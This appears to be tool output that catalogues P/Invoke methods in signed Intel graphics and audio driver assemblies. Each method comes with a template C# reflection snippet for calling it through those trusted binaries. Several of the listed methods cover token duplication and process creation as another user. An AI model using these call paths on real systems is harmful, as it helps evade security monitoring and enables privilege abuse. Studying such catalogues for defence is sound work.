        var methodInfo = t.GetMethod(""clGetPlatformInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode result = (OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode) methodInfo.Invoke(null, new object[] { PlatformID platform, PlatformInfo param_name, IntPtr param_value_size, Byte[] param_value, IntPtr& param_value_size_ret });
        ===END SIGNATURE===

Method: CreateDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateDC"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData });
        ===END SIGNATURE===

Method: clGetPlatformInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""clGetPlatformInfo"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode result = (OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode) methodInfo.Invoke(null, new object[] { PlatformID platform, PlatformInfo param_name, IntPtr param_value_size, IntPtr param_value, IntPtr& param_value_size_ret });
        ===END SIGNATURE===

Method: ChoosePixelFormat
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ChoosePixelFormat"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hdc, PixelFormatDescriptor& pfd });
        ===END SIGNATURE===

Method: SetPixelFormat
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetPixelFormat"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hdc, int iPixelFormat, PixelFormatDescriptor& pfd });
        ===END SIGNATURE===

Method: wglCreateContext
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""wglCreateContext"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hdc });
        ===END SIGNATURE===

Method: wglMakeCurrent
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""wglMakeCurrent"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hdc, IntPtr hglrc });
        ===END SIGNATURE===

Method: wglDeleteContext
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""wglDeleteContext"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hglrc });
        ===END SIGNATURE===

Method: glGetString
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""glGetString"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { GLStringNames name });
        ===END SIGNATURE===

Method: OpenProcessToken
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.D3D.DXDB.WindowsIdentityManager"", true);
        var methodInfo = t.GetMethod(""OpenProcessToken"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr ProcessHandle, int DesiredAccess, IntPtr& TokenHandle });
        ===END SIGNATURE===

Method: CloseHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.D3D.DXDB.WindowsIdentityManager"", true);
        var methodInfo = t.GetMethod(""CloseHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle });
        ===END SIGNATURE===

Method: DuplicateToken
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.D3D.DXDB.WindowsIdentityManager"", true);
        var methodInfo = t.GetMethod(""DuplicateToken"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, IntPtr& DuplicateTokenHandle });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\IntelGraphicsAGS.exe
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.SDKCommandLine.exe
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.WinService.exe

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.WinService.exe"");
        Type t = asm.GetType(""OneApp.IGCC.WinService.igccservice"", true);
        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle, ServiceStatus& serviceStatus });
        ===END SIGNATURE===

Method: RegisterTypeLib
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.WinService.exe"");
        Type t = asm.GetType(""OneApp.IGCC.WinService.COMManager.RegisterLibs"", true);
        var methodInfo = t.GetMethod(""RegisterTypeLib"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { ITypeLib tlib, string szFullPath, string szHelpDir });
        ===END SIGNATURE===

Method: UnRegisterTypeLib
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.WinService.exe"");
        Type t = asm.GetType(""OneApp.IGCC.WinService.COMManager.RegisterLibs"", true);
        var methodInfo = t.GetMethod(""UnRegisterTypeLib"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid& libID, ushort wVerMajor, ushort wVerMinor, int lcid, SYSKIND syskind });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll

Method: ACADetectorGetCaps
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACADetectorGetCaps"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _acaIpSoundList });
        ===END SIGNATURE===

Method: ACARegisterNotificationHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACARegisterNotificationHandle"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { uint _callerPid, Guid _appId, IntPtr _eventHandle });
        ===END SIGNATURE===

Method: ACAUnregisterNotificationHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACAUnregisterNotificationHandle"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid _appId });
        ===END SIGNATURE===

Method: ACAStartSoundDetect
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACAStartSoundDetect"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid _appId, Guid _moduleId, Guid _soundId, AcaPolicy _policy, UInt32& _requestId });
        ===END SIGNATURE===

Method: ACAStopSoundDetect
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACAStopSoundDetect"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { Guid _appId, uint _requestId });
        ===END SIGNATURE===

Method: ACASetIpParam
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACASetIpParam"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid _appId, Guid _moduleId, uint _paramId, Byte[] _paramValue, uint _paramSize });
        ===END SIGNATURE===

Method: ACAGetIpParam
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACAGetIpParam"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid _appId, Guid _moduleId, uint _paramId, Byte[]& _paramValue, UInt32& _paramSize });
        ===END SIGNATURE===

Method: ACAContextQuery
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACAContextQuery"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid _appId, IntPtr _acaDetection });
        ===END SIGNATURE===

Method: GetApiVersion
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""GetApiVersion"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { UInt32& _major, UInt32& _minor });
        ===END SIGNATURE===

Method: GetLibraryVersion
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""GetLibraryVersion"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { UnicodeString& _version });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe

Method: CreateProcessAsUserWExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelNativeWinAPI.ProcessNativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateProcessAsUserWExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, string lpEnvironment, string lpCurrentDirectory, STARTUPINFO& lpStartupInfo, PROCESS_INFORMATION& lpProcessInformation });
        ===END SIGNATURE===

Method: CloseHandleExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelNativeWinAPI.ProcessNativeMethods"", true);
        var methodInfo = t.GetMethod(""CloseHandleExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hHandle });
        ===END SIGNATURE===

Method: WTSGetActiveConsoleSessionIdExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelNativeWinAPI.ProcessNativeMethods"", true);
        var methodInfo = t.GetMethod(""WTSGetActiveConsoleSessionIdExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: GetServiceDirectoryExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelNativeWinAPI.ProcessNativeMethods"", true);
        var methodInfo = t.GetMethod(""GetServiceDirectoryExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt16 result = (System.UInt16) methodInfo.Invoke(null, new object[] { IntPtr _serviceStatusHandle, ServiceDirectoryType _directoryType, StringBuilder _pathBuffer, ushort _pathBufferLength, UInt16& _requiredBufferLength });
        ===END SIGNATURE===

Method: SetDllDirectoryWExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelNativeWinAPI.ProcessNativeMethods"", true);
        var methodInfo = t.GetMethod(""SetDllDirectoryWExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string _path });
        ===END SIGNATURE===

Method: InitRpcLauncherDll
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.RpcService.RpcServerWrapper"", true);
        var methodInfo = t.GetMethod(""InitRpcLauncherDll"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: StartRpcServerDll
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.RpcService.RpcServerWrapper"", true);
        var methodInfo = t.GetMethod(""StartRpcServerDll"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _pRpcLauncher });
        ===END SIGNATURE===

Method: StopRpcServerDll
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.RpcService.RpcServerWrapper"", true);
        var methodInfo = t.GetMethod(""StopRpcServerDll"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _pRpcLauncher });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyAssistantSubscribeDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyAssistantSubscribeDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { AssistantSubscribeDelegate _assistantSubscribeDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyAssistantUnsubscribeDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyAssistantUnsubscribeDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { AssistantUnsubscribeDelegate _assistantUnsubscribeDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyRegisterPdtDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyRegisterPdtDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { RegisterPdtDelegate _registerPdtDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyRegisterUdtDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyRegisterUdtDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { RegisterUdtDelegate _registerUdtDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyAddSvDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyAddSvDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { AddSvDelegate _addSvDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyUnregisterPdtDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyUnregisterPdtDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { UnregisterPdtDelegate _unregisterPdtDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyUnregisterUdtDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyUnregisterUdtDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { UnregisterUdtDelegate _unregisterUdtDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyRemoveSvDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyRemoveSvDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { RemoveSvDelegate _removeSvDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyQueryCapabilitiesDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyQueryCapabilitiesDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { QueryCapabilitiesDelegate _queryCapabilitiesDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyQueryCurrentLanguageDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyQueryCurrentLanguageDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { QueryCurrentLanguageDelegate _queryCurrentLanguageDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyGetMultiPaApiVersionDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyGetMultiPaApiVersionDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { GetMultiPaApiVersionDelegate _getMultiPaApiVersionDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxySetMultiPaParameterDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxySetMultiPaParameterDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
